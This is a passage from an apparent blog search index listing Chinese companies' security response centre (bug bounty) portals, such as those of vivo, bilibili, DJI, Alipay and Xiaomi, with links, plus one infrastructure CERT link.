href="https://security.yuanfudao.com/">https://security.yuanfudao.com/</a></td><td></td></tr><tr><td>华米</td><td><a href="https://src.zepp.com/">https://src.zepp.com/</a></td><td></td></tr><tr><td>小赢ying</td><td><a href="https://security.xiaoying.com/">https://security.xiaoying.com/</a></td><td></td></tr><tr><td>麦当劳</td><td><a href="https://security.mcd.cn/">https://security.mcd.cn/</a></td><td></td></tr><tr><td>58同城</td><td><a href="https://security.58.com/">https://security.58.com/</a></td><td></td></tr><tr><td>vivo</td><td><a href="https://security.vivo.com.cn/">https://security.vivo.com.cn/</a></td><td></td></tr><tr><td>爱奇艺</td><td><a href="https://security.iqiyi.com/">https://security.iqiyi.com/</a></td><td></td></tr><tr><td>bilibili</td><td><a href="https://security.bilibili.com/">https://security.bilibili.com/</a></td><td></td></tr><tr><td>东方财富</td><td><a href="https://security.eastmoney.com/">https://security.eastmoney.com/</a></td><td></td></tr><tr><td>大疆</td><td><a href="https://security.dji.com/">https://security.dji.com/</a></td><td></td></tr><tr><td>途虎</td><td><a href="https://security.tuhu.cn/">https://security.tuhu.cn/</a></td><td></td></tr><tr><td>喜马拉雅</td><td><a href="https://security.ximalaya.com/">https://security.ximalaya.com/</a></td><td></td></tr><tr><td>陌陌</td><td><a href="https://security.immomo.com/">https://security.immomo.com/</a></td><td></td></tr><tr><td>深信服</td><td><a href="https://security.sangfor.com.cn/">https://security.sangfor.com.cn/</a></td><td></td></tr><tr><td>宜信</td><td><a href="https://security.creditease.cn/">https://security.creditease.cn/</a></td><td></td></tr><tr><td>合合</td><td><a href="https://security.intsig.com/">https://security.intsig.com/</a></td><td></td></tr><tr><td>斗鱼</td><td><a href="https://security.douyu.com/">https://security.douyu.com/</a></td><td></td></tr><tr><td>海康威视</td><td><a href="https://www.hikvision.com/cn/support/CybersecurityCenter/">https://www.hikvision.com/cn/support/CybersecurityCenter/</a></td><td></td></tr><tr><td>小鹏</td><td><a href="https://security.xiaopeng.com/">https://security.xiaopeng.com/</a></td><td></td></tr><tr><td>Boss直聘</td><td><a href="https://src.zhipin.com/">https://src.zhipin.com/</a></td><td></td></tr><tr><td>携程</td><td><a href="https://sec.ctrip.com/">https://sec.ctrip.com/</a></td><td></td></tr><tr><td>完美世界</td><td><a href="https://security.wanmei.com/">https://security.wanmei.com/</a></td><td></td></tr><tr><td>法大大</td><td><a href="https://sec.fadada.com/">https://sec.fadada.com/</a></td><td></td></tr><tr><td>贝壳</td><td><a href="https://security.ke.com/">https://security.ke.com/</a></td><td></td></tr><tr><td>东航</td><td><a href="https://src.ceair.com/">https://src.ceair.com/</a></td><td></td></tr><tr><td>蚂蚁</td><td><a href="https://security.alipay.com/">https://security.alipay.com/</a></td><td></td></tr><tr><td>银联</td><td><a href="https://security.unionpay.com/">https://security.unionpay.com/</a></td><td></td></tr><tr><td>富途</td><td><a href="https://ftsrc.futunn.com/">https://ftsrc.futunn.com/</a></td><td></td></tr><tr><td>持安</td><td><a href="https://security.chiansec.com/">https://security.chiansec.com/</a></td><td></td></tr><tr><td>迅雷</td><td><a href="https://security.xunlei.com/">https://security.xunlei.com/</a></td><td></td></tr><tr><td>猪八戒</td><td><a href="https://security.zbj.com/">https://security.zbj.com/</a></td><td></td></tr><tr><td>TCL</td><td><a href="https://src.tcl.com/">https://src.tcl.com/</a></td><td></td></tr><tr><td>焦点</td><td><a href="https://security.focuschina.com/">https://security.focuschina.com/</a></td><td></td></tr><tr><td>T3</td><td><a href="https://security.t3go.cn/">https://security.t3go.cn/</a></td><td></td></tr><tr><td>soul</td><td><a href="https://security.soulapp.cn/">https://security.soulapp.cn/</a></td><td></td></tr><tr><td>众安</td><td><a href="https://security.zhongan.com/">https://security.zhongan.com/</a></td><td></td></tr><tr><td>唯品会</td><td><a href="https://sec.vip.com/">https://sec.vip.com/</a></td><td></td></tr><tr><td>瓜子二手车</td><td><a href="https://security.guazi.com/">https://security.guazi.com/</a></td><td></td></tr><tr><td>爱世博</td><td><a href="https://security.acb.bet/">https://security.acb.bet/</a></td><td></td></tr><tr><td>贝锐</td><td><a href="https://security.oray.com/">https://security.oray.com/</a></td><td></td></tr><tr><td>马蜂窝</td><td><a href="https://security.mafengwo.cn/">https://security.mafengwo.cn/</a></td><td></td></tr><tr><td>有赞</td><td><a href="https://src.youzan.com/">https://src.youzan.com/</a></td><td></td></tr><tr><td>美丽联合</td><td><a href="https://security.mogu.com/">https://security.mogu.com/</a></td><td></td></tr><tr><td>水滴</td><td><a href="https://security.shuidihuzhu.com/">https://security.shuidihuzhu.com/</a></td><td></td></tr><tr><td>知识星球</td><td><a href="https://security.zsxq.com/">https://security.zsxq.com/</a></td><td></td></tr><tr><td>360数科</td><td><a href="https://security.360sk.com/">https://security.360sk.com/</a></td><td></td></tr><tr><td>统信</td><td><a href="https://src.uniontech.com/">https://src.uniontech.com/</a></td><td></td></tr><tr><td>猎聘</td><td><a href="https://security.liepin.com/">https://security.liepin.com/</a></td><td></td></tr><tr><td>竞技世界</td><td><a href="https://security.jj.cn/">https://security.jj.cn/</a></td><td></td></tr><tr><td>去哪儿网</td><td><a href="https://security.qunar.com/">https://security.qunar.com/</a></td><td></td></tr><tr><td>魅族</td><td><a href="https://sec.meizu.com/">https://sec.meizu.com/</a></td><td></td></tr><tr><td>vipkid</td><td><a href="https://security.vipkid.com.cn/">https://security.vipkid.com.cn/</a></td><td></td></tr><tr><td>融360</td><td><a href="https://security.rong360.com/">https://security.rong360.com/</a></td><td></td></tr><tr><td>虎牙ya</td><td><a href="https://security.huya.com/">https://security.huya.com/</a></td><td></td></tr><tr><td>酷狗</td><td><a href="https://security.kugou.com/">https://security.kugou.com/</a></td><td></td></tr><tr><td>YY</td><td><a href="https://security.yy.com/">https://security.yy.com/</a></td><td></td></tr><tr><td>智联</td><td><a href="https://src.zhaopin.com/">https://src.zhaopin.com/</a></td><td></td></tr><tr><td>多点</td><td><a href="https://src.dmall.com/">https://src.dmall.com/</a></td><td></td></tr><tr><td>DHgate</td><td><a href="https://dhsrc.dhgate.com/">https://dhsrc.dhgate.com/</a></td><td></td></tr><tr><td>小米</td><td><a href="https://sec.xiaomi.com/">https://sec.xiaomi.com/</a></td><td></td></tr><tr><td>网易</td><td><a href="https://aq.163.com/">https://aq.163.com/</a></td><td></td></tr><tr><td>安恒</td><td><a href="https://security.dbappsecurity.com.cn/">https://security.dbappsecurity.com.cn/</a></td><td></td></tr><tr><td>菜鸟</td><td><a href="https://sec.cainiao.com/">https://sec.cainiao.com/</a></td><td></td></tr><tr><td>天融信</td><td><a href="https://src.topsec.com.cn/">https://src.topsec.com.cn/</a></td><td></td></tr></tbody></table><h2 id="其他安全平台"><a href="#其他安全平台" class="headerlink" title="其他安全平台"></a>其他安全平台</h2><table><thead><tr><th>厂商</th><th>链接</th></tr></thead><tbody><tr><td>关键基础设施安全应急响应中心</td><td><a href="https://www.ics-cert.org.cn/">https://www.ics-cert.org.cn/</a></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> bugbounty </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bugbounty </tag>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
